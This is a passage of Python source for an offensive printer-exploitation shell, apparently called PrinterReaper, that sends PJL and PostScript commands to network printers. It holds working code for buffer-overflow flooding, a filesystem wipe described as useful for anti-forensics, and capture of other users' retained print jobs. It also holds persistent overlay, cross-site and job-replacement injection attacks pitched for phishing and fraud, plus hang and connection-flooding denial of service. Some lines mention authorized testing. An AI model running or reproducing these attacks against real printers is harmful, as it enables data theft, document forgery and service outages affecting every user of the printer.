        size = conv().int(arg) or 10000  # buffer size
        output().warning(f"Flooding with {size} bytes...")
        
        # Create flood data
        flood_data = "A" * size
        self.cmd("@PJL DISPLAY " + c.QUOTE + flood_data + c.QUOTE, False)
        output().info("Flood command sent")

    def help_flood(self):
        """Show help for flood command"""
        print()
        print("flood - Flood printer input to test for buffer overflows")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends a large amount of data to test for buffer overflow")
        print("  vulnerabilities in the printer's input handling.")
        print()
        print("USAGE:")
        print("  flood [size]")
        print()
        print("EXAMPLES:")
        print("  flood                            # Flood with 10000 bytes")
        print("  flood 50000                      # Flood with 50000 bytes")
        print("  flood 100000                     # Large flood test")
        print()
        print("NOTES:")
        print("  - Default size is 10000 bytes")
        print("  - May crash or hang the printer")
        print("  - Used to discover buffer overflow vulnerabilities")
        print("  - Printer may need restart after flooding")
        print()

    def do_hold(self, arg):
        "Enable job retention"
        self.chitchat("Enabling job retention...")
        self.cmd("@PJL SET JOBRETENTION=ON")
        output().info("Job retention enabled")

    def help_hold(self):
        """Show help for hold command"""
        print()
        print("hold - Enable job retention on the printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Enables job retention mode, causing print jobs to be held")
        print("  in memory rather than printed immediately.")
        print()
        print("USAGE:")
        print("  hold")
        print()
        print("EXAMPLES:")
        print("  hold                             # Enable job retention")
        print()
        print("NOTES:")
        print("  - Jobs are held until manually released")
        print("  - Can be used to capture print jobs")
        print("  - Use capture command to retrieve held jobs")
        print("  - May fill up printer memory")
        print()

    def do_format(self, arg):
        "Initialize printer's mass storage file system"
        output().warning("This will format the printer's file system!")
        confirm = input("Are you sure? (yes/no): ")
        if confirm.lower() == 'yes':
            self.cmd("@PJL FORMAT", False)
            output().info("File system formatted")
        else:
            output().info("Format cancelled")

    def help_format(self):
        """Show help for format command"""
        print()
        print("format - Initialize/format printer's file system")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  **DESTRUCTIVE** - Formats the printer's mass storage device,")
        print("  erasing all stored files, configurations, and data.")
        print()
        print("USAGE:")
        print("  format")
        print()
        print("EXAMPLES:")
        print("  format                           # Format file system")
        print()
        print("WARNINGS:")
        print("  ⚠️  ALL DATA WILL BE LOST")
        print("  ⚠️  CANNOT BE UNDONE")
        print("  ⚠️  REQUIRES CONFIRMATION")
        print()
        print("NOTES:")
        print("  - Erases all files and directories")
        print("  - Cannot be undone")
        print("  - Requires 'yes' confirmation")
        print("  - Use for cleanup or anti-forensics")
        print()

    # --------------------------------------------------------------------
    # 🌐 REDE E CONECTIVIDADE (5 comandos)
    # --------------------------------------------------------------------

    def do_network(self, arg):
        "Show comprehensive network information including WiFi"
        print("Network Information:")
        print("=" * 50)
        
        # Get network info
        net_info = self.cmd("@PJL INFO NETWORK")
        if net_info:
            print("Network Configuration:")
            print(net_info)
        
        # Get IP configuration
        ip_info = self.cmd("@PJL INFO IP")
        if ip_info:
            print("\nIP Configuration:")
            print(ip_info)
        
        # Get WiFi info
        wifi_info = self.cmd("@PJL INFO WIFI")
        if wifi_info:
            print("\nWi-Fi Information:")
            print(wifi_info)
        else:
            output().info("Wi-Fi information not available")

    def do_direct(self, *arg):
        "Show direct-print configuration"
        print("Direct Print Configuration:")
        print("=" * 50)
        
        # Get direct print info
        direct_info = self.cmd("@PJL INFO DIRECT")
        if direct_info:
            print(direct_info)
        else:
            output().info("Direct print information not available")

    def help_direct(self):
        """Show help for direct command"""
        print()
        print("direct - Show direct-print configuration")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Displays the printer's direct-print configuration, showing")
        print("  how the printer handles direct port printing.")
        print()
        print("USAGE:")
        print("  direct")
        print()
        print("EXAMPLES:")
        print("  direct                           # Show direct-print config")
        print()
        print("NOTES:")
        print("  - Shows direct printing settings")
        print("  - Not all printers support this")
        print("  - Useful for understanding print flow")
        print()

    def do_execute(self, arg):
        "Execute arbitrary PJL command: execute <command>"
        if not arg:
            output().errmsg("Usage: execute <command>")
            return
        
        output().info(f"Executing: {arg}")
        result = self.cmd(arg)
        if result:
            print(result)

    def help_execute(self):
        """Show help for execute command"""
        print()
        print("execute - Execute arbitrary PJL command")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends a raw PJL command directly to the printer without")
        print("  interpretation. Useful for testing custom commands.")
        print()
        print("USAGE:")
        print("  execute <command>")
        print()
        print("EXAMPLES:")
        print("  execute @PJL INFO STATUS         # Get status")
        print("  execute @PJL SET TIMEOUT=90      # Set timeout")
        print("  execute @PJL INQUIRE COPIES      # Query setting")
        print()
        print("NOTES:")
        print("  - Command is sent as-is")
        print("  - No validation performed")
        print("  - Use for testing custom PJL commands")
        print("  - Requires knowledge of PJL syntax")
        print("  - May crash printer if invalid")
        print()


    # --------------------------------------------------------------------
    # 📊 MONITORAMENTO (2 comandos)
    # --------------------------------------------------------------------

    def do_pagecount(self, arg):
        "Manipulate printer's page counter: pagecount <number>"
        if not arg:
            # Just show current page count
            count = self.cmd("@PJL INFO PAGECOUNT")
            if count:
                print(f"Current page count: {count.strip()}")
        else:
            try:
                new_count = int(arg)
                self.cmd(f"@PJL SET PAGECOUNT={new_count}")
                output().info(f"Page count set to {new_count}")
            except ValueError:
                output().errmsg("Invalid page count value")

    def help_pagecount(self):
        """Show help for pagecount command"""
        print()
        print("pagecount - Manipulate printer's page counter")
        print("Usage: pagecount [number]")
        print("Shows current page count or sets it to a specific number.")
        print("Example: pagecount 1000")
        print()

    # --------------------------------------------------------------------
    # HELP SYSTEM
    # --------------------------------------------------------------------

    def help_filesystem(self):
        """Show help for filesystem commands"""
        print()
        print("Filesystem Commands:")
        print("=" * 50)
        print("ls          - List directory contents")
        print("mkdir       - Create directory")
        print("find        - Find files recursively")
        print("upload      - Upload file to printer")
        print("download    - Download file from printer")
        print("delete      - Delete file")
        print("copy        - Copy file")
        print("move        - Move file")
        print("touch       - Create/update file")
        print("chmod       - Change file permissions")
        print("permissions - Test file permissions")
        print("mirror      - Mirror filesystem")
        print()

    def help_system(self):
        """Show help for system information commands"""
        print()
        print("System Information Commands:")
        print("=" * 50)
        print("id          - Show comprehensive printer identification and system information")
        print("variables   - Show environment variables")
        print("printenv    - Show specific variable")
        print()

    def help_control(self):
        """Show help for control commands"""
        print()
        print("Control Commands:")
        print("=" * 50)
        print("set         - Set environment variable")
        print("display     - Set display message")
        print("offline     - Take printer offline")
        print("restart     - Restart printer")
        print("reset       - Reset to factory defaults")
        print("selftest    - Perform self-tests")
        print("backup      - Backup configuration")
        print("restore     - Restore configuration")
        print()

    def help_security(self):
        """Show help for security commands"""
        print()
        print("Security Commands:")
        print("=" * 50)
        print("lock        - Lock printer with PIN")
        print("unlock      - Unlock printer")
        print("disable     - Disable functionality")
        print("nvram       - Access NVRAM")
        print()

    def help_attacks(self):
        """Show help for attack commands"""
        print()
        print("Attack Commands:")
        print("=" * 50)
        print("destroy     - Cause physical damage")
        print("flood       - Flood with data")
        print("hold        - Enable job retention")
        print("format      - Format filesystem")
        print()

    def help_network(self):
        """Show help for network commands"""
        print()
        print("Network Commands:")
        print("=" * 50)
        print("network     - Show comprehensive network information including WiFi")
        print("direct      - Show direct print config")
        print("execute     - Execute arbitrary PJL command")
        print("load        - Load commands from file")
        print()

    def help_monitoring(self):
        """Show help for monitoring commands"""
        print()
        print("Monitoring Commands:")
        print("=" * 50)
        print("pagecount   - Manipulate page counter")
        print("status      - Toggle status messages")
        print()

    def do_test_interrupt(self, arg):
        "Test interrupt handling system"
        output().info("Testing interrupt handling system...")
        output().info("This command will run for 10 seconds. Press Ctrl+C to interrupt.")
        
        try:
            for i in range(100):  # 10 seconds with 0.1 second intervals
                if hasattr(self, 'interrupted') and self.interrupted:
                    output().warning("Test interrupted by user")
                    return
                
                output().info(f"Test running... {i+1}/100")
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            output().warning("Test interrupted by keyboard")
            return
        
        output().info("Test completed successfully")

    def help_test_interrupt(self):
        """Show help for test_interrupt command"""
        print()
        print("test_interrupt - Test interrupt handling system")
        print("Usage: test_interrupt")
        print("Tests the interrupt handling system by running a timed operation.")
        print("Use Ctrl+C to interrupt the test.")
        print()

    def do_help(self, arg):
        """Show help for commands"""
        if not arg:
            print()
            print("PrinterReaper v2.3.1 - PJL Commands (100% Attack Coverage)")
            print("=" * 70)
            print("Available command categories:")
            print("  filesystem   - File system operations (13 commands)")
            print("  system       - System information (3 commands)")
            print("  information  - Advanced info gathering (3 commands)")
            print("  control      - Control and configuration (8 commands)")
            print("  security     - Security and access (4 commands)")
            print("  attacks      - Attack and testing (17 commands) ⚠")
            print("  network      - Network and connectivity (3 commands)")
            print("  monitoring   - Monitoring and status (2 commands)")
            print("  test         - Testing and debugging (1 command)")
            print()
            print("Total: 54 PJL commands available")
            print("Attack coverage: 100% of known PJL attacks")
            print()
            print("Use 'help <category>' for detailed help")
            print("Use 'help <command>' for specific command help")
            print()
        elif arg == "filesystem":
            self.help_filesystem()
        elif arg == "system":
            self.help_system()
        elif arg == "information":
            self.help_information()
        elif arg == "control":
            self.help_control()
        elif arg == "security":
            self.help_security()
        elif arg == "attacks":
            self.help_attacks()
        elif arg == "network":
            self.help_network()
        elif arg == "monitoring":
            self.help_monitoring()
        elif arg == "test":
            print()
            print("Test Commands:")
            print("=" * 70)
            print("  test_interrupt - Test interrupt handling system")
            print()
        else:
            # Try to find specific command help
            method_name = f"help_{arg}"
            if hasattr(self, method_name):
                getattr(self, method_name)()
            else:
                output().errmsg(f"No help available for '{arg}'")

    # --------------------------------------------------------------------
    # UTILITY METHODS
    # --------------------------------------------------------------------

    def dirlist(self, path, recursive=False, show_files=True):
        """List directory contents"""
        if not path:
            path = "."
        
        try:
            result = self.cmd("@PJL FSDIRLIST NAME=\"" + path + "\"")
            if result:
                return result
        except Exception as e:
            output().errmsg(f"Directory listing failed: {e}")
        return ""

    def fswalk(self, path, operation):
        """Walk filesystem recursively"""
        if not path:
            path = "."
        
        try:
            if operation == "find":
                result = self.cmd("@PJL FSDIRLIST NAME=\"" + path + "\"")
                if result:
                    print(result)
            elif operation == "mirror":
                output().info(f"Mirroring {path}...")
                # Implementation would go here
        except Exception as e:
            output().errmsg(f"Filesystem walk failed: {e}")

    def chitchat(self, message):
        """Display chatty message"""
        output().info(message)

    def fileerror(self, raw):
        """Handle file errors"""
        if "FILEERROR" in raw:
            output().errmsg("File operation failed")

    # --------------------------------------------------------------------
    # OPTIONS AND CONFIGURATION
    # --------------------------------------------------------------------

    @property
    def options_info(self):
        """Available info categories"""
        return [
            "id", "status", "memory", "filesys", "variables", "config",
            "network", "wifi", "direct", "nvram", "pagecount"
        ]
    
    # --------------------------------------------------------------------
    # FILE OPERATIONS (Implementing missing methods from printer base class)
    # --------------------------------------------------------------------
    
    def get(self, path):
        """
        Download/read file from printer using PJL FSDOWNLOAD
        Returns tuple (size, data) or c.NONEXISTENT if file doesn't exist
        """
        try:
            from utils.helper import const as c
            
            # Try to download the file using PJL FSDOWNLOAD
            result = self.cmd(f"@PJL FSDOWNLOAD NAME=\"{path}\"", binary=True)
            
            if result and len(result) > 0:
                # File exists and was downloaded
                return (len(result), result.encode() if isinstance(result, str) else result)
            else:
                # File doesn't exist or is empty
                return c.NONEXISTENT
                
        except Exception as e:
            output().errmsg(f"Get file failed: {e}")
            from utils.helper import const as c
            return c.NONEXISTENT
    
    def put(self, path, data):
        """
        Upload/write file to printer using PJL FSUPLOAD
        Returns size of data written or c.NONEXISTENT on error
        """
        try:
            from utils.helper import const as c
            
            # Ensure data is bytes
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            # Upload file using PJL FSUPLOAD
            self.cmd(f"@PJL FSUPLOAD NAME=\"{path}\" OFFSET=0 SIZE={len(data)}")
            self.send(data)
            
            # Return size of data written
            return len(data)
            
        except Exception as e:
            output().errmsg(f"Put file failed: {e}")
            from utils.helper import const as c
            return c.NONEXISTENT
    
    def append(self, path, data):
        """
        Append data to file on printer
        First reads file, then writes it back with appended data
        """
        try:
            from utils.helper import const as c
            
            # Ensure data is string for appending
            if isinstance(data, bytes):
                data = data.decode('utf-8')
            
            # Try to read existing file
            result = self.get(path)
            
            if result == c.NONEXISTENT:
                # File doesn't exist, create new with data
                existing_data = ""
            else:
                # File exists, get its content
                size, content = result
                existing_data = content.decode('utf-8') if isinstance(content, bytes) else content
            
            # Append new data
            new_data = existing_data + data + "\n"
            
            # Write back to file
            return self.put(path, new_data)
            
        except Exception as e:
            output().errmsg(f"Append failed: {e}")
            from utils.helper import const as c
            return c.NONEXISTENT
    
    def delete(self, path):
        """
        Delete file using PJL FSDELETE
        """
        try:
            self.cmd(f"@PJL FSDELETE NAME=\"{path}\"")
            output().info(f"Deleted {path}")
            return True
        except Exception as e:
            output().errmsg(f"Delete failed: {e}")
            return False
    
    # ====================================================================
    # 🎯 PRINT JOB MANIPULATION COMMANDS (P0 - CRITICAL)
    # ====================================================================
    # Commands for capturing and manipulating print jobs
    
    def do_capture(self, arg):
        """Capture and download retained print jobs from printer"""
        output().info("Querying retained print jobs...")
        
        # Method 1: Query job information
        jobs_info = self.cmd("@PJL INFO JOBS")
        if jobs_info and len(jobs_info.strip()) > 0:
            print("Jobs in queue:")
            print("=" * 60)
            print(jobs_info)
            print("=" * 60)
        else:
            output().warning("No jobs found via INFO JOBS")
        
        # Method 2: List job files in filesystem (try multiple volumes)
        job_paths_to_try = [
            ("0:", "jobs"),
            ("0:", "webServer/jobs"),
            ("1:", "saveDevice/SavedJobs/InProgress"),
            ("1:", "saveDevice/SavedJobs/KeepJobs"),
            ("1:", "savedJobs"),
            ("2:", "jobs"),
        ]
        
        jobs_found = False
        for vol, job_path in job_paths_to_try:
            full_path = f"{vol}/{job_path}"
            output().info(f"Checking {full_path}...")
            
            try:
                result = self.cmd(f"@PJL FSDIRLIST NAME=\"{full_path}\"")
                if result and len(result.strip()) > 20:
                    jobs_found = True
                    print(f"\n✓ Jobs found in {full_path}:")
                    print("=" * 60)
                    print(result)
                    print("=" * 60)
                    
                    # Parse and download if requested
                    if arg == "download" or arg == "all":
                        job_files = self.parse_dirlist(result)
                        for job_file in job_files:
                            if job_file and not job_file.startswith('.'):
                                job_full_path = f"{full_path}/{job_file}"
                                output().info(f"Downloading {job_file}...")
                                self.do_download(f"{job_full_path} captured_{job_file}")
            except Exception as e:
                if self.debug:
                    output().errmsg(f"Error checking {full_path}: {e}")
        
        if not jobs_found:
            output().warning("No print jobs found in filesystem")
            output().info("Try enabling job retention first: hold")
    
    def help_capture(self):
        """Capture retained print jobs from printer"""
        print()
        print("capture - Capture retained print jobs from printer")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Captures and downloads print jobs that have been retained by the printer.")
        print("  This can reveal sensitive documents that were printed by other users.")
        print("  Requires job retention to be enabled (use 'hold' command first).")
        print()
        print("USAGE:")
        print("  capture                  # List all retained jobs")
        print("  capture download         # List and download all jobs")
        print("  capture all              # Same as download")
        print()
        print("EXAMPLES:")
        print("  hold                     # Enable job retention first")
        print("  capture                  # List retained jobs")
        print("  capture download         # Download all jobs to local directory")
        print()
        print("SECURITY IMPACT: CRITICAL")
        print("  - Access to other users' documents")
        print("  - Potential data breach")
        print("  - Confidential information exposure")
        print()
        print("NOTES:")
        print("  - Jobs are searched in multiple volumes (0:, 1:, 2:)")
        print("  - Downloaded jobs are saved with 'captured_' prefix")
        print("  - Some printers automatically delete jobs after time")
        print("  - Works best after enabling job retention")
        print()
    
    def parse_dirlist(self, dirlist):
        """Parse FSDIRLIST output to extract filenames"""
        files = []
        for line in dirlist.split('\n'):
            # Parse format: ENTRY=1 NAME="file" SIZE=1234 TYPE=FILE
            match = re.search(r'NAME="([^"]+)"', line)
            if match:
                filename = match.group(1)
                # Skip directories
                if 'TYPE=DIR' not in line.upper():
                    files.append(filename)
        return files
    
    def do_overlay(self, arg):
        """Overlay attack - add watermark/content to all print jobs"""
        if not arg:
            output().errmsg("Usage: overlay <eps_file>")
            output().info("Creates overlay that will be printed on all documents")
            output().info("Example: overlay watermark.eps")
            return
        
        # Read overlay file (should be EPS format for best compatibility)
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            output().info("Overlay file should be in EPS (Encapsulated PostScript) format")
            return
        
        overlay_data = file().read(arg)
        if not overlay_data:
            return
        
        output().warning("═" * 70)
        output().warning("DANGER: Installing overlay attack!")
        output().warning("This will affect ALL future print jobs on this printer!")
        output().warning("All documents will include your overlay content!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Continue with overlay attack? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Overlay attack cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Overlay attack cancelled")
            return
        
        # Upload overlay to printer
        overlay_path = "0:/overlay.eps"
        size = self.put(overlay_path, overlay_data)
        
        if size == c.NONEXISTENT:
            output().errmsg("Failed to upload overlay file")
            return
        
        output().info(f"✓ Overlay uploaded to {overlay_path} ({size} bytes)")
        
        # Configure printer to use overlay (varies by manufacturer)
        # Try multiple methods
        
        # Method 1: HP PJL commands
        self.cmd("@PJL SET OVERLAY=ON")
        self.cmd(f"@PJL SET OVERLAYFILE=\"{overlay_path}\"")
        output().info("✓ Overlay configured via PJL (HP method)")
        
        # Method 2: PostScript setpagedevice
        ps_config = f"""
%!PS-Adobe-3.0
<< /BeginPage {{
    gsave
    ({overlay_path}) run
    grestore
}} >> setpagedevice
"""
        config_path = "0:/system/overlay_config.ps"
        self.put(config_path, ps_config.encode())
        output().info(f"✓ PostScript config uploaded to {config_path}")
        
        # Method 3: Set as startup job
        self.cmd(f"@PJL SET STARTUPJOB=\"{config_path}\"")
        
        output().info("✓ Overlay attack installed successfully!")
        output().warning("⚠ All future print jobs will include the overlay!")
        output().info("To remove: Use 'overlay_remove' command or factory reset")
    
    def help_overlay(self):
        """Overlay attack - add watermark to all print jobs"""
        print()
        print("overlay - Overlay attack (add watermark to all print jobs)")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Installs an overlay (watermark) that will be printed on ALL future")
        print("  documents. The overlay can be used for:")
        print("  - Adding watermarks (e.g., 'CONFIDENTIAL')")
        print("  - Phishing attacks (fake headers/footers)")
        print("  - Disinformation campaigns")
        print("  - Document manipulation")
        print()
        print("USAGE:")
        print("  overlay <eps_file>")
        print()
        print("EXAMPLES:")
        print("  overlay watermark.eps    # Add watermark overlay")
        print("  overlay phishing.eps     # Phishing attack overlay")
        print("  overlay logo.eps         # Add company logo")
        print()
        print("FILE FORMAT:")
        print("  - EPS (Encapsulated PostScript) recommended")
        print("  - PostScript (.ps) also works")
        print("  - File should contain visual elements to overlay")
        print()
        print("SECURITY IMPACT: CRITICAL")
        print("  - Affects ALL users' documents")
        print("  - Persistent until removed")
        print("  - Can be used for social engineering")
        print("  - Hard to detect by users")
        print()
        print("REMOVAL:")
        print("  - Use 'overlay_remove' command")
        print("  - Or factory reset")
        print("  - Or delete overlay file and restart")
        print()
        print("NOTES:")
        print("  - Requires confirmation")
        print("  - Works on most HP, Lexmark, Canon printers")
        print("  - May not work on all printer models")
        print()
    
    def do_overlay_remove(self, arg):
        """Remove overlay attack"""
        output().info("Removing overlay attack...")
        
        try:
            # Method 1: Disable overlay
            self.cmd("@PJL SET OVERLAY=OFF")
            output().info("✓ Overlay disabled via PJL")
            
            # Method 2: Delete overlay files
            self.cmd("@PJL FSDELETE NAME=\"0:/overlay.eps\"")
            self.cmd("@PJL FSDELETE NAME=\"0:/system/overlay_config.ps\"")
            output().info("✓ Overlay files deleted")
            
            # Method 3: Clear startup job
            self.cmd("@PJL SET STARTUPJOB=\"\"")
            output().info("✓ Startup job cleared")
            
            output().info("✓ Overlay attack removed successfully!")
            output().info("Restart printer to ensure complete removal")
            
        except Exception as e:
            output().errmsg(f"Overlay removal failed: {e}")
    
    def help_overlay_remove(self):
        """Remove overlay attack"""
        print()
        print("overlay_remove - Remove overlay attack from printer")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Removes a previously installed overlay attack.")
        print("  Disables overlay, deletes overlay files, and clears startup jobs.")
        print()
        print("USAGE:")
        print("  overlay_remove")
        print()
        print("EXAMPLES:")
        print("  overlay_remove           # Remove overlay attack")
        print()
        print("NOTES:")
        print("  - Reverses 'overlay' command")
        print("  - Restart printer recommended after removal")
        print("  - Factory reset also removes overlay")
        print()
    
    def do_cross(self, arg):
        """Cross-site printing - inject content into other users' print jobs"""
        if not arg:
            output().errmsg("Usage: cross <content_file>")
            output().info("Injects malicious content into print jobs from other users")
            output().info("Example: cross phishing_header.ps")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            return
        
        content = file().read(arg)
        if not content:
            return
        
        output().warning("═" * 70)
        output().warning("DANGER: Cross-site printing attack!")
        output().warning("This will inject your content into OTHER USERS' print jobs!")
        output().warning("Highly visible and easily detectable!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Continue with cross-site printing? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Cross-site printing attack cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Attack cancelled")
            return
        
        # Enable job retention first
        self.cmd("@PJL SET JOBRETENTION=ON")
        output().info("✓ Job retention enabled")
        
        # Create PostScript injection code
        if isinstance(content, bytes):
            content_str = content.decode('utf-8', errors='ignore')
        else:
            content_str = content
        
        ps_injection = f"""
%!PS-Adobe-3.0
<< /BeginPage {{
    gsave
    100 750 moveto
    /Helvetica findfont 12 scalefont setfont
    ({content_str[:100]}) show
    grestore
}} >> setpagedevice
"""
        
        # Upload injection code
        inject_path = "0:/system/inject.ps"
        self.put(inject_path, ps_injection.encode())
        output().info(f"✓ Injection code uploaded to {inject_path}")
        
        # Configure to run on all jobs
        self.cmd(f"@PJL SET JOBINJECT=\"{inject_path}\"")
        self.cmd("@PJL SET JOBINTERCEPT=ON")
        
        # Alternative method: Enter PostScript and set page device
        self.cmd("@PJL ENTER LANGUAGE=POSTSCRIPT")
        self.send(ps_injection.encode())
        self.send(b"\x04")  # EOT
        
        output().info("✓ Cross-site printing attack installed!")
        output().warning("⚠ Your content will appear in other users' print jobs!")
    
    def help_cross(self):
        """Cross-site printing attack"""
        print()
        print("cross - Cross-site printing attack")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Injects malicious content into print jobs from other users.")
        print("  Your content will appear in documents printed by others.")
        print("  Can be used for:")
        print("  - Phishing attacks (fake headers with malicious links)")
        print("  - Disinformation campaigns")
        print("  - Social engineering")
        print("  - Internal attacks")
        print()
        print("USAGE:")
        print("  cross <content_file>")
        print()
        print("EXAMPLES:")
        print("  cross phishing_header.ps  # Inject phishing header")
        print("  cross malicious_text.txt  # Inject text content")
        print("  cross fake_footer.eps     # Inject fake footer")
        print()
        print("FILE FORMAT:")
        print("  - PostScript (.ps) recommended")
        print("  - Plain text (.txt) also works")
        print("  - EPS (.eps) for graphics")
        print()
        print("SECURITY IMPACT: CRITICAL")
        print("  - Affects all users on the network")
        print("  - Can be used for phishing")
        print("  - Very visible and detectable")
        print("  - May violate laws (use only for authorized testing!)")
        print()
        print("DETECTION:")
        print("  - Easily detected by affected users")
        print("  - Appears in printed documents")
        print("  - Logs may show unusual activity")
        print()
        print("REMOVAL:")
        print("  - Factory reset")
        print("  - Delete injection files")
        print("  - Restart printer")
        print()
        print("⚠ WARNING: For authorized security testing ONLY!")
        print()
    
    def do_replace(self, arg):
        """Replace attack - substitute entire print job content"""
        if not arg:
            output().errmsg("Usage: replace <replacement_file>")
            output().info("Replaces ALL print jobs with your specified content")
            output().info("Example: replace fake_document.ps")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            return
        
        replacement = file().read(arg)
        if not replacement:
            return
        
        output().warning("═" * 70)
        output().warning("EXTREME DANGER: Document replacement attack!")
        output().warning("ALL print jobs will be COMPLETELY REPLACED with your content!")
        output().warning("Users will print YOUR document instead of theirs!")
        output().warning("This is a SEVERE attack that may have legal consequences!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Continue with replacement attack? (type 'YES I UNDERSTAND'): ")
            if confirm != 'YES I UNDERSTAND':
                output().info("Replace attack cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Attack cancelled")
            return
        
        # Upload replacement content
        replace_path = "0:/system/replacement.ps"
        size = self.put(replace_path, replacement)
        if size == c.NONEXISTENT:
            output().errmsg("Failed to upload replacement file")
            return
        
        output().info(f"✓ Replacement uploaded ({size} bytes)")
        
        # Configure job replacement (varies by printer model)
        # HP method
        self.cmd("@PJL SET JOBREPLACE=ON")
        self.cmd(f"@PJL SET JOBREPLACEFILE=\"{replace_path}\"")
        
        # Alternative: PostScript job server
        ps_replace = f"""
%!PS-Adobe-3.0
statusdict begin
    /jobserver {{
        ({replace_path}) run
    }} def
end
"""
        self.put("0:/system/jobserver.ps", ps_replace.encode())
        self.cmd("@PJL SET JOBSERVER=\"0:/system/jobserver.ps\"")
        
        output().info("✓ Replace attack installed!")
        output().warning("⚠ ALL print jobs will now be replaced with your document!")
        output().warning("⚠ This attack is HIGHLY visible and detectable!")
    
    def help_replace(self):
        """Replace attack - substitute print job content"""
        print()
        print("replace - Replace attack (substitute entire job content)")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Replaces ALL print jobs with your specified document.")
        print("  Users will print YOUR document instead of their own.")
        print("  EXTREMELY dangerous and easily detectable attack.")
        print()
        print("USAGE:")
        print("  replace <replacement_file>")
        print()
        print("EXAMPLES:")
        print("  replace fake_invoice.ps   # Replace all jobs with fake invoice")
        print("  replace phishing_doc.pdf  # Replace with phishing document")
        print()
        print("FILE FORMAT:")
        print("  - PostScript (.ps) recommended")
        print("  - PDF (.pdf) may work on some printers")
        print("  - PCL (.pcl) for PCL printers")
        print()
        print("SECURITY IMPACT: EXTREME - CRITICAL")
        print("  - Complete job substitution")
        print("  - Users print wrong documents")
        print("  - Potential for fraud/forgery")
        print("  - May violate multiple laws")
        print()
        print("DETECTION:")
        print("  - IMMEDIATELY detected by users")
        print("  - Printed output is wrong")
        print("  - Will cause investigation")
        print()
        print("LEGAL WARNING:")
        print("  ⚠ This attack may constitute:")
        print("    - Computer fraud")
        print("    - Document forgery")
        print("    - Unauthorized access")
        print("  ⚠ Use ONLY for authorized security testing!")
        print("  ⚠ Obtain written permission before use!")
        print()
        print("REMOVAL:")
        print("  - Factory reset required")
        print("  - Delete all system files")
        print("  - Contact printer administrator")
        print()
    
    # ====================================================================
    # 💥 DENIAL OF SERVICE ATTACKS (Additional)
    # ====================================================================
    
    def do_hang(self, arg):
        """Hang printer with malformed PJL commands"""
        output().warning("═" * 70)
        output().warning("DANGER: Printer hang attack!")
        output().warning("This will attempt to CRASH/HANG the printer!")
        output().warning("Printer may require POWER CYCLE to recover!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Continue with hang attack? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Hang attack cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Attack cancelled")
            return
        
        output().info("Launching hang attack...")
        output().info("Multiple attack vectors will be attempted...")
        
        # Vector 1: Invalid language
        output().info("Vector 1: Invalid ENTER LANGUAGE")
        self.cmd("@PJL ENTER LANGUAGE=INVALID_LANGUAGE", False)
        time.sleep(0.5)
        
        # Vector 2: Conflicting commands
        output().info("Vector 2: Conflicting commands")
        self.cmd("@PJL SET LANGUAGE=UNKNOWN", False)
        self.cmd("@PJL INITIALIZE", False)
        time.sleep(0.5)
        
        # Vector 3: Rapid DEFAULT/RESET
        output().info("Vector 3: Rapid factory reset loop")
        for i in range(10):
            self.cmd("@PJL DEFAULT", False)
            self.cmd("@PJL RESET", False)
            time.sleep(0.1)
        
        # Vector 4: Invalid file operations
        output().info("Vector 4: Invalid filesystem operations")
        self.cmd("@PJL FSINIT VOLUME=\"99:\"", False)
        self.cmd("@PJL FSDELETE NAME=\"/../../../../system\"", False)
        
        # Vector 5: Buffer overflow attempt
        output().info("Vector 5: Buffer overflow attempts")
        huge_string = "A" * 100000
        self.cmd(f"@PJL SET INVALIDVAR=\"{huge_string}\"", False)
        
        output().info("✓ Hang attack vectors sent")
        output().warning("⚠ Printer may be unresponsive - check printer status")
        output().warning("⚠ Power cycle may be required")
    
    def help_hang(self):
        """Hang printer with malformed commands"""
        print()
        print("hang - Hang/crash printer attack")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Attempts to hang or crash the printer using malformed PJL commands.")
        print("  Multiple attack vectors are used:")
        print("  - Invalid ENTER LANGUAGE commands")
        print("  - Conflicting control commands")
        print("  - Rapid factory reset loops")
        print("  - Invalid filesystem operations")
        print("  - Buffer overflow attempts")
        print()
        print("USAGE:")
        print("  hang")
        print()
        print("EXAMPLES:")
        print("  hang                     # Execute hang attack")
        print()
        print("SECURITY IMPACT: HIGH")
        print("  - Printer becomes unresponsive")
        print("  - Denial of service")
        print("  - May require power cycle")
        print("  - Can affect all network users")
        print()
        print("RECOVERY:")
        print("  - Power cycle printer")
        print("  - Disconnect from network")
        print("  - Factory reset may be needed")
        print()
        print("NOTES:")
        print("  - Requires confirmation")
        print("  - Different printers vulnerable to different vectors")
        print("  - Success rate varies by model/firmware")
        print("  - Use only for authorized security testing")
        print()
    
    def do_dos_connections(self, arg):
        """DoS attack via connection flooding"""
        count = conv().int(arg) or 100
        
        output().warning("═" * 70)
        output().warning(f"DoS attack: Flooding {count} connections to {self.target}:9100")
        output().warning("This will make the printer unavailable to legitimate users!")
        output().warning("═" * 70)
        
        try:
            confirm = input(f"Flood {count} connections? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Connection flooding cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Attack cancelled")
            return
        
        import threading
        
        connections = []
        success_count = 0
        
        def create_connection(conn_id):
